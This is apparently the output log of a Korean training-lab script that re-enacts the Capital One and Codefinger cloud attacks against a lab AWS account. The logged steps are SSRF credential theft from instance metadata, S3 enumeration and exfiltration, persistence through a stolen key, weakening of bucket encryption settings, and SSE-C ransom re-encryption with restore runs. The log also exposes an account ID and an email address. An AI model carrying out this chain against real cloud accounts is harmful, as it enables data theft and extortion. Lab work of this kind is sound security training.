[01:03:35] INFO  ================================================================
[01:03:35] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[01:03:35] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[01:03:35] INFO  ================================================================
[01:03:36] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[01:03:36] INFO  ================================================================
[01:03:36] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[01:03:36] INFO  ================================================================
[01:03:36] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[01:03:36] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[01:03:36] INFO        Expiration=2026-09-29T22:15:48Z
[01:03:36] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-0fcdfe3b2fcb3ebe4
[01:03:36] INFO  ================================================================
[01:03:36] INFO    STEP 3 — 정찰(T1580): S3/STS/IAM 리소스 열거
[01:03:36] INFO  ================================================================
[01:03:37] INFO    [+] sts:GetCallerIdentity Arn=arn:aws:sts::896986966760:assumed-role/cloud9-infra-attack-ec2-role/i-0fcdfe3b2fcb3ebe4
[01:03:38] INFO    [+] s3:ListAllMyBuckets — 15개
[01:03:38] INFO        - cloud9-attack-profile-a396cc5b
[01:03:38] INFO        - cloud9-attack-target-a396cc5b
[01:03:38] INFO        - cloud9-security-896986966760-ap-northeast-2-cloudtrail
[01:03:38] INFO        - cloud9-security-normalized-logs-896986966760-ap-northeast-2-an
[01:03:38] INFO        - cloud943-attack-tfstate
[01:03:38] INFO        - hitl-dashboard-reports-5c7d05592bb4b3dfddcf6026b8
[01:03:38] INFO        - whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an
[01:03:38] INFO        - whs-elk-s3-artifacts-896986966760-ap-northeast-2
[01:03:38] INFO        - whs-elk-s3-investigation-results-896986966760-ap-northeast-2
[01:03:38] INFO        - whs-elk-s3-raw-896986966760-ap-northeast-2
[01:03:38] INFO        - whs-elk-s3-snapshots-896986966760-ap-northeast-2
[01:03:38] INFO        - whs-ir-test-cloudtrail-20260924
[01:03:38] INFO        - whs-ir-test-target-20260924
[01:03:38] INFO        - whs-ssrf-tfstate-896986966760
[01:03:38] INFO        - whs-weekly-report-bucket
[01:03:39] INFO    [expected] iam:ListUsers → AccessDenied (예상된 차단 — CloudTrail 증거 확보)
[01:03:39] INFO  ================================================================
[01:03:39] INFO    STEP 4 — S3 데이터 수집·유출(T1530/T1537)
[01:03:39] INFO  ================================================================
[01:03:39] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv (3292 bytes) → exfiltrated/customers.csv
[01:03:39] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json (155 bytes) → exfiltrated/config.json
[01:03:39] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt (48 bytes) → exfiltrated/flag.txt
[01:03:39] INFO    [=] 유출 3/3 파일
[01:03:39] INFO  ================================================================
[01:03:39] INFO    STEP 5 — 장기 자격증명(AKIA) 확보
[01:03:39] INFO  ================================================================
[01:03:39] INFO    [+] config.json 탈취 — 내부 장기 자격증명(더미) AccessKeyId=AKIAFA…(20자)
[01:03:39] INFO    [+] 장기 자격증명 확보: AccessKeyId=AKIA5B…(20자)
[01:03:39] INFO        → 임시키 만료(역할 최대 세션 1시간) 후에도 접근이 유지되는 지속성 확보
[01:03:39] INFO        → 이후 6·7 은 이 키로 실행 — CloudTrail 에 principal 이 바뀌어 찍힌다
[01:03:40] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[01:03:40] INFO  [skip] 6 GuardDuty 비활성화 — 필요 시 --disable-guardduty
[01:03:40] INFO  [skip] 7 SSE-C 재암호화 — 필요 시 --ransom (복구는 --restore)
[01:03:40] INFO  ================================================================
[01:03:40] INFO    SCENARIO 1 종료
[01:03:40] INFO    로그: scenario1/scenario1.log
[01:03:40] INFO  ================================================================
[01:04:23] INFO  ================================================================
[01:04:23] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[01:04:23] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[01:04:23] INFO  ================================================================
[01:04:23] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[01:04:23] INFO  ================================================================
[01:04:23] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[01:04:23] INFO  ================================================================
[01:04:23] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[01:04:23] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[01:04:23] INFO        Expiration=2026-09-29T22:15:48Z
[01:04:23] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-0fcdfe3b2fcb3ebe4
[01:04:23] INFO  ================================================================
[01:04:23] INFO    STEP 3 — 정찰(T1580): S3/STS/IAM 리소스 열거
[01:04:23] INFO  ================================================================
[01:04:24] INFO    [+] sts:GetCallerIdentity Arn=arn:aws:sts::896986966760:assumed-role/cloud9-infra-attack-ec2-role/i-0fcdfe3b2fcb3ebe4
[01:04:25] INFO    [+] s3:ListAllMyBuckets — 15개
[01:04:25] INFO        - cloud9-attack-profile-a396cc5b
[01:04:25] INFO        - cloud9-attack-target-a396cc5b
[01:04:25] INFO        - cloud9-security-896986966760-ap-northeast-2-cloudtrail
[01:04:25] INFO        - cloud9-security-normalized-logs-896986966760-ap-northeast-2-an
[01:04:25] INFO        - cloud943-attack-tfstate
[01:04:25] INFO        - hitl-dashboard-reports-5c7d05592bb4b3dfddcf6026b8
[01:04:25] INFO        - whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an
[01:04:25] INFO        - whs-elk-s3-artifacts-896986966760-ap-northeast-2
[01:04:25] INFO        - whs-elk-s3-investigation-results-896986966760-ap-northeast-2
[01:04:25] INFO        - whs-elk-s3-raw-896986966760-ap-northeast-2
[01:04:25] INFO        - whs-elk-s3-snapshots-896986966760-ap-northeast-2
[01:04:25] INFO        - whs-ir-test-cloudtrail-20260924
[01:04:25] INFO        - whs-ir-test-target-20260924
[01:04:25] INFO        - whs-ssrf-tfstate-896986966760
[01:04:25] INFO        - whs-weekly-report-bucket
[01:04:26] INFO    [expected] iam:ListUsers → AccessDenied (예상된 차단 — CloudTrail 증거 확보)
[01:04:26] INFO  ================================================================
[01:04:26] INFO    STEP 4 — S3 데이터 수집·유출(T1530/T1537)
[01:04:26] INFO  ================================================================
[01:04:26] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv (3292 bytes) → exfiltrated/customers.csv
[01:04:26] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json (155 bytes) → exfiltrated/config.json
[01:04:26] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt (48 bytes) → exfiltrated/flag.txt
[01:04:26] INFO    [=] 유출 3/3 파일
[01:04:26] INFO  ================================================================
[01:04:26] INFO    STEP 5 — 장기 자격증명(AKIA) 확보
[01:04:26] INFO  ================================================================
[01:04:26] INFO    [+] config.json 탈취 — 내부 장기 자격증명(더미) AccessKeyId=AKIAFA…(20자)
[01:04:26] INFO    [+] 장기 자격증명 확보: AccessKeyId=AKIA5B…(20자)
[01:04:26] INFO        → 임시키 만료(역할 최대 세션 1시간) 후에도 접근이 유지되는 지속성 확보
[01:04:26] INFO        → 이후 6·7 은 이 키로 실행 — CloudTrail 에 principal 이 바뀌어 찍힌다
[01:04:27] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[01:04:27] INFO  [skip] 6 GuardDuty 비활성화 — 필요 시 --disable-guardduty
[01:04:27] INFO  ================================================================
[01:04:27] INFO    STEP 7 — SSE-C 재암호화 랜섬(T1486)
[01:04:27] INFO  ================================================================
[01:04:27] INFO    [+] 버킷 버저닝 상태 = Disabled
[01:04:27] WARNING   [!] 버저닝 미활성 — 이전 버전 롤백 경로가 없다.
[01:04:27] WARNING       복구는 recovery/ssec.key 에 전적으로 의존한다. 이 파일을 잃지 말 것.
[01:04:28] INFO    [+] 재암호화 대상 3개 (s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/)
[01:04:28] INFO        - whs-data/config.json
[01:04:28] INFO        - whs-data/customers.csv
[01:04:28] INFO        - whs-data/flag.txt
[01:04:28] INFO    [+] SSE-C 키 확보(os.urandom(32) 신규 생성) 및 로컬 저장·검증 완료
[01:04:28] INFO        키 파일 : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key
[01:04:28] INFO        메타    : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key.meta.json (대상 목록·복구 명령 포함)
[01:04:28] INFO        복구    : python scenario1.py --restore
[01:04:28] INFO    [+] 현재 차단된 암호화 유형 = ['SSE-C']
[01:04:28] INFO        변경 전 설정 저장: recovery/bucket_encryption_before.json
[01:04:28] WARNING   [!] SSE-C 차단 해제 시도 (T1562.001) — 버킷 보안 설정 변경
[01:04:28] WARNING   [+] SSE-C 차단 해제됨 — 실습 후 원복 필요(--restore 가 되돌린다)
[01:04:28] WARNING   [!] 재암호화 시작 — 이후 이 객체들은 키 없이 읽을 수 없다.
[01:04:28] INFO    [expected] s3:CopyObject(SSE-C) s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json → AccessDenied (예상된 차단 — CloudTrail 증거 확보)
[01:04:28] INFO    [expected] s3:CopyObject(SSE-C) s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv → AccessDenied (예상된 차단 — CloudTrail 증거 확보)
[01:04:28] INFO    [expected] s3:CopyObject(SSE-C) s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt → AccessDenied (예상된 차단 — CloudTrail 증거 확보)
[01:04:28] INFO    [=] 재암호화 0개 / 차단 3개
[01:04:28] INFO        차단된 3개는 PutObject Deny — CloudTrail 탐지 증거
[01:04:28] INFO  ================================================================
[01:04:28] INFO    SCENARIO 1 종료
[01:04:28] INFO    로그: scenario1/scenario1.log
[01:04:28] INFO  ================================================================
[01:04:49] INFO  ================================================================
[01:04:49] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[01:04:49] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[01:04:49] INFO  ================================================================
[01:04:49] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[01:04:49] INFO  ================================================================
[01:04:49] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[01:04:49] INFO  ================================================================
[01:04:49] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[01:04:49] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[01:04:49] INFO        Expiration=2026-09-29T22:15:48Z
[01:04:49] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-0fcdfe3b2fcb3ebe4
[01:04:51] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[01:04:51] INFO  ================================================================
[01:04:51] INFO    RESTORE — SSE-C 재암호화 원상복구
[01:04:51] INFO  ================================================================
[01:04:51] INFO    [+] 저장된 SSE-C 키 로드: recovery/ssec.key
[01:04:51] INFO    [+] 암호화 기록에서 대상 0개 확인
[01:04:51] INFO    [=] 복구 0개 / 실패 0개
[01:04:51] INFO    [+] 버킷 암호화 설정 원복 완료 (SSE-C 차단 복원)
[01:04:51] INFO  ================================================================
[01:04:51] INFO    SCENARIO 1 복구 종료
[01:04:51] INFO    로그: scenario1/scenario1.log
[01:04:51] INFO  ================================================================
[01:06:38] INFO  ================================================================
[01:06:38] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[01:06:38] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[01:06:38] INFO  ================================================================
[01:06:38] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[01:06:38] INFO  ================================================================
[01:06:38] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[01:06:38] INFO  ================================================================
[01:06:38] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[01:06:38] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[01:06:38] INFO        Expiration=2026-09-29T22:15:48Z
[01:06:38] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-0fcdfe3b2fcb3ebe4
[01:06:38] INFO  ================================================================
[01:06:38] INFO    STEP 3 — 정찰(T1580): S3/STS/IAM 리소스 열거
[01:06:38] INFO  ================================================================
[01:06:39] INFO    [+] sts:GetCallerIdentity Arn=arn:aws:sts::896986966760:assumed-role/cloud9-infra-attack-ec2-role/i-0fcdfe3b2fcb3ebe4
[01:06:40] INFO    [+] s3:ListAllMyBuckets — 15개
[01:06:40] INFO        - cloud9-attack-profile-a396cc5b
[01:06:40] INFO        - cloud9-attack-target-a396cc5b
[01:06:40] INFO        - cloud9-security-896986966760-ap-northeast-2-cloudtrail
[01:06:40] INFO        - cloud9-security-normalized-logs-896986966760-ap-northeast-2-an
[01:06:40] INFO        - cloud943-attack-tfstate
[01:06:40] INFO        - hitl-dashboard-reports-5c7d05592bb4b3dfddcf6026b8
[01:06:40] INFO        - whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an
[01:06:40] INFO        - whs-elk-s3-artifacts-896986966760-ap-northeast-2
[01:06:40] INFO        - whs-elk-s3-investigation-results-896986966760-ap-northeast-2
[01:06:40] INFO        - whs-elk-s3-raw-896986966760-ap-northeast-2
[01:06:40] INFO        - whs-elk-s3-snapshots-896986966760-ap-northeast-2
[01:06:40] INFO        - whs-ir-test-cloudtrail-20260924
[01:06:40] INFO        - whs-ir-test-target-20260924
[01:06:40] INFO        - whs-ssrf-tfstate-896986966760
[01:06:40] INFO        - whs-weekly-report-bucket
[01:06:41] INFO    [expected] iam:ListUsers → AccessDenied (예상된 차단 — CloudTrail 증거 확보)
[01:06:41] INFO  ================================================================
[01:06:41] INFO    STEP 4 — S3 데이터 수집·유출(T1530/T1537)
[01:06:41] INFO  ================================================================
[01:06:41] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv (3292 bytes) → exfiltrated/customers.csv
[01:06:41] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json (155 bytes) → exfiltrated/config.json
[01:06:41] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt (48 bytes) → exfiltrated/flag.txt
[01:06:41] INFO    [=] 유출 3/3 파일
[01:06:41] INFO  ================================================================
[01:06:41] INFO    STEP 5 — 장기 자격증명(AKIA) 확보
[01:06:41] INFO  ================================================================
[01:06:41] INFO    [+] config.json 탈취 — 내부 장기 자격증명(더미) AccessKeyId=AKIAFA…(20자)
[01:06:41] INFO    [+] 장기 자격증명 확보: AccessKeyId=AKIA5B…(20자)
[01:06:41] INFO        → 임시키 만료(역할 최대 세션 1시간) 후에도 접근이 유지되는 지속성 확보
[01:06:41] INFO        → 이후 6·7 은 이 키로 실행 — CloudTrail 에 principal 이 바뀌어 찍힌다
[01:06:42] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[01:06:42] INFO  [skip] 6 GuardDuty 비활성화 — 필요 시 --disable-guardduty
[01:06:42] INFO  ================================================================
[01:06:42] INFO    STEP 7 — SSE-C 재암호화 랜섬(T1486)
[01:06:42] INFO  ================================================================
[01:06:43] INFO    [+] 버킷 버저닝 상태 = Disabled
[01:06:43] WARNING   [!] 버저닝 미활성 — 이전 버전 롤백 경로가 없다.
[01:06:43] WARNING       복구는 recovery/ssec.key 에 전적으로 의존한다. 이 파일을 잃지 말 것.
[01:06:43] INFO    [+] 재암호화 대상 3개 (s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/)
[01:06:43] INFO        - whs-data/config.json
[01:06:43] INFO        - whs-data/customers.csv
[01:06:43] INFO        - whs-data/flag.txt
[01:06:43] INFO    [+] SSE-C 키 확보(os.urandom(32) 신규 생성) 및 로컬 저장·검증 완료
[01:06:43] INFO        키 파일 : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key
[01:06:43] INFO        메타    : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key.meta.json (대상 목록·복구 명령 포함)
[01:06:43] INFO        복구    : python scenario1.py --restore
[01:06:43] INFO    [+] 현재 차단된 암호화 유형 = ['SSE-C']
[01:06:43] INFO        변경 전 설정 저장: recovery/bucket_encryption_before.json
[01:06:43] WARNING   [!] SSE-C 차단 해제 시도 (T1562.001) — 버킷 보안 설정 변경
[01:06:48] WARNING       BlockedEncryptionTypes 제거 로는 안 풀렸다 — 다음 방식 시도
[01:06:48] ERROR   [FAIL] s3:PutBucketEncryption(BlockedEncryptionTypes 빈 목록) → InvalidArgument: if BlockedEncryptionTypes is specified, it must contain at least one encryption type
[01:08:43] INFO  ================================================================
[01:08:43] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[01:08:43] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[01:08:43] INFO  ================================================================
[01:08:43] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[01:08:43] INFO  ================================================================
[01:08:43] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[01:08:43] INFO  ================================================================
[01:08:43] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[01:08:43] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[01:08:43] INFO        Expiration=2026-09-29T22:15:48Z
[01:08:43] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-0fcdfe3b2fcb3ebe4
[01:08:43] INFO  ================================================================
[01:08:43] INFO    STEP 3 — 정찰(T1580): S3/STS/IAM 리소스 열거
[01:08:43] INFO  ================================================================
[01:08:44] INFO    [+] sts:GetCallerIdentity Arn=arn:aws:sts::896986966760:assumed-role/cloud9-infra-attack-ec2-role/i-0fcdfe3b2fcb3ebe4
[01:08:45] INFO    [+] s3:ListAllMyBuckets — 15개
[01:08:45] INFO        - cloud9-attack-profile-a396cc5b
[01:08:45] INFO        - cloud9-attack-target-a396cc5b
[01:08:45] INFO        - cloud9-security-896986966760-ap-northeast-2-cloudtrail
[01:08:45] INFO        - cloud9-security-normalized-logs-896986966760-ap-northeast-2-an
[01:08:45] INFO        - cloud943-attack-tfstate
[01:08:45] INFO        - hitl-dashboard-reports-5c7d05592bb4b3dfddcf6026b8
[01:08:45] INFO        - whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an
[01:08:45] INFO        - whs-elk-s3-artifacts-896986966760-ap-northeast-2
[01:08:45] INFO        - whs-elk-s3-investigation-results-896986966760-ap-northeast-2
[01:08:45] INFO        - whs-elk-s3-raw-896986966760-ap-northeast-2
[01:08:45] INFO        - whs-elk-s3-snapshots-896986966760-ap-northeast-2
[01:08:45] INFO        - whs-ir-test-cloudtrail-20260924
[01:08:45] INFO        - whs-ir-test-target-20260924
[01:08:45] INFO        - whs-ssrf-tfstate-896986966760
[01:08:45] INFO        - whs-weekly-report-bucket
[01:08:46] INFO    [expected] iam:ListUsers → AccessDenied (예상된 차단 — CloudTrail 증거 확보)
[01:08:46] INFO  ================================================================
[01:08:46] INFO    STEP 4 — S3 데이터 수집·유출(T1530/T1537)
[01:08:46] INFO  ================================================================
[01:08:46] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv (3292 bytes) → exfiltrated/customers.csv
[01:08:46] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json (155 bytes) → exfiltrated/config.json
[01:08:46] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt (48 bytes) → exfiltrated/flag.txt
[01:08:46] INFO    [=] 유출 3/3 파일
[01:08:46] INFO  ================================================================
[01:08:46] INFO    STEP 5 — 장기 자격증명(AKIA) 확보
[01:08:46] INFO  ================================================================
[01:08:46] INFO    [+] config.json 탈취 — 내부 장기 자격증명(더미) AccessKeyId=AKIAFA…(20자)
[01:08:46] INFO    [+] 장기 자격증명 확보: AccessKeyId=AKIA5B…(20자)
[01:08:46] INFO        → 임시키 만료(역할 최대 세션 1시간) 후에도 접근이 유지되는 지속성 확보
[01:08:46] INFO        → 이후 6·7 은 이 키로 실행 — CloudTrail 에 principal 이 바뀌어 찍힌다
[01:08:47] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[01:08:47] INFO  [skip] 6 GuardDuty 비활성화 — 필요 시 --disable-guardduty
[01:08:47] INFO  ================================================================
[01:08:47] INFO    STEP 7 — SSE-C 재암호화 랜섬(T1486)
[01:08:47] INFO  ================================================================
[01:08:47] INFO    [+] 버킷 버저닝 상태 = Disabled
[01:08:47] WARNING   [!] 버저닝 미활성 — 이전 버전 롤백 경로가 없다.
[01:08:47] WARNING       복구는 recovery/ssec.key 에 전적으로 의존한다. 이 파일을 잃지 말 것.
[01:08:48] INFO    [+] 재암호화 대상 3개 (s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/)
[01:08:48] INFO        - whs-data/config.json
[01:08:48] INFO        - whs-data/customers.csv
[01:08:48] INFO        - whs-data/flag.txt
[01:08:48] INFO    [+] SSE-C 키 확보(os.urandom(32) 신규 생성) 및 로컬 저장·검증 완료
[01:08:48] INFO        키 파일 : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key
[01:08:48] INFO        메타    : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key.meta.json (대상 목록·복구 명령 포함)
[01:08:48] INFO        복구    : python scenario1.py --restore
[01:08:48] INFO    [+] 현재 차단된 암호화 유형 = ['SSE-C']
[01:08:48] INFO        변경 전 설정 저장: recovery/bucket_encryption_before.json
[01:08:48] WARNING   [!] SSE-C 차단 해제 시도 (T1562.001) — 버킷 보안 설정 변경
[01:08:48] WARNING   [+] SSE-C 차단 해제 확인됨 — 실습 후 원복 필요(--restore)
[01:08:48] WARNING   [!] 재암호화 시작 — 이후 이 객체들은 키 없이 읽을 수 없다.
[01:08:48] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[01:08:48] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[01:08:48] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[01:08:48] INFO    [=] 재암호화 3개 / 차단 0개
[01:08:48] WARNING       복구: python scenario1.py --restore  (키: recovery/ssec.key)
[01:08:48] INFO  ================================================================
[01:08:48] INFO    SCENARIO 1 종료
[01:08:48] INFO    로그: scenario1/scenario1.log
[01:08:48] INFO  ================================================================
[01:09:18] INFO  ================================================================
[01:09:18] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[01:09:18] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[01:09:18] INFO  ================================================================
[01:09:19] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[01:09:19] INFO  ================================================================
[01:09:19] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[01:09:19] INFO  ================================================================
[01:09:19] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[01:09:19] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[01:09:19] INFO        Expiration=2026-09-29T22:15:48Z
[01:09:19] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-0fcdfe3b2fcb3ebe4
[01:09:20] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[01:09:20] INFO  ================================================================
[01:09:20] INFO    RESTORE — SSE-C 재암호화 원상복구
[01:09:20] INFO  ================================================================
[01:09:20] INFO    [+] 저장된 SSE-C 키 로드: recovery/ssec.key
[01:09:20] INFO    [+] 암호화 기록에서 대상 3개 확인
[01:09:20] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[01:09:20] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[01:09:20] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[01:09:20] INFO    [=] 복구 3개 / 실패 0개
[01:09:21] INFO    [+] 버킷 암호화 설정 원복 완료 (SSE-C 차단 복원)
[01:09:21] INFO  ================================================================
[01:09:21] INFO    SCENARIO 1 복구 종료
[01:09:21] INFO    로그: scenario1/scenario1.log
[01:09:21] INFO  ================================================================
[01:09:48] INFO  ================================================================
[01:09:48] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[01:09:48] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[01:09:48] INFO  ================================================================
[01:09:49] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[01:09:49] INFO  ================================================================
[01:09:49] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[01:09:49] INFO  ================================================================
[01:09:49] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[01:09:49] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[01:09:49] INFO        Expiration=2026-09-29T22:15:48Z
[01:09:49] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-0fcdfe3b2fcb3ebe4
[01:09:49] INFO  ================================================================
[01:09:49] INFO    STEP 3 — 정찰(T1580): S3/STS/IAM 리소스 열거
[01:09:49] INFO  ================================================================
[01:09:50] INFO    [+] sts:GetCallerIdentity Arn=arn:aws:sts::896986966760:assumed-role/cloud9-infra-attack-ec2-role/i-0fcdfe3b2fcb3ebe4
[01:09:50] INFO    [+] s3:ListAllMyBuckets — 15개
[01:09:50] INFO        - cloud9-attack-profile-a396cc5b
[01:09:50] INFO        - cloud9-attack-target-a396cc5b
[01:09:50] INFO        - cloud9-security-896986966760-ap-northeast-2-cloudtrail
[01:09:50] INFO        - cloud9-security-normalized-logs-896986966760-ap-northeast-2-an
[01:09:50] INFO        - cloud943-attack-tfstate
[01:09:50] INFO        - hitl-dashboard-reports-5c7d05592bb4b3dfddcf6026b8
[01:09:50] INFO        - whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an
[01:09:50] INFO        - whs-elk-s3-artifacts-896986966760-ap-northeast-2
[01:09:50] INFO        - whs-elk-s3-investigation-results-896986966760-ap-northeast-2
[01:09:50] INFO        - whs-elk-s3-raw-896986966760-ap-northeast-2
[01:09:50] INFO        - whs-elk-s3-snapshots-896986966760-ap-northeast-2
[01:09:50] INFO        - whs-ir-test-cloudtrail-20260924
[01:09:50] INFO        - whs-ir-test-target-20260924
[01:09:50] INFO        - whs-ssrf-tfstate-896986966760
[01:09:50] INFO        - whs-weekly-report-bucket
[01:09:51] INFO    [expected] iam:ListUsers → AccessDenied (예상된 차단 — CloudTrail 증거 확보)
[01:09:51] INFO  ================================================================
[01:09:51] INFO    STEP 4 — S3 데이터 수집·유출(T1530/T1537)
[01:09:51] INFO  ================================================================
[01:09:52] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv (3292 bytes) → exfiltrated/customers.csv
[01:09:52] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json (155 bytes) → exfiltrated/config.json
[01:09:52] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt (48 bytes) → exfiltrated/flag.txt
[01:09:52] INFO    [=] 유출 3/3 파일
[01:09:52] INFO  ================================================================
[01:09:52] INFO    STEP 5 — 장기 자격증명(AKIA) 확보
[01:09:52] INFO  ================================================================
[01:09:52] INFO    [+] config.json 탈취 — 내부 장기 자격증명(더미) AccessKeyId=AKIAFA…(20자)
[01:09:52] INFO    [+] 장기 자격증명 확보: AccessKeyId=AKIA5B…(20자)
[01:09:52] INFO        → 임시키 만료(역할 최대 세션 1시간) 후에도 접근이 유지되는 지속성 확보
